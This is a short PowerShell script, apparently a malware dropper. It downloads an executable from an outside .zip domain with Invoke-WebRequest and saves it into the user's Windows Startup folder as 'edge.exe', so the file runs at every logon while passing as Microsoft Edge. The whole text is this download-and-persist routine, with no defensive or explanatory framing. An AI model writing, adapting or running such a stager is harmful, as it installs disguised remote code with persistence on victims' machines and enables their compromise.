$startupFolder = [Environment]::GetFolderPath("Startup")
$url = "https://csabi.zip/a.exe"
$outputPath = Join-Path $startupFolder "edge.exe"

Invoke-WebRequest -Uri $url -OutFile $outputPath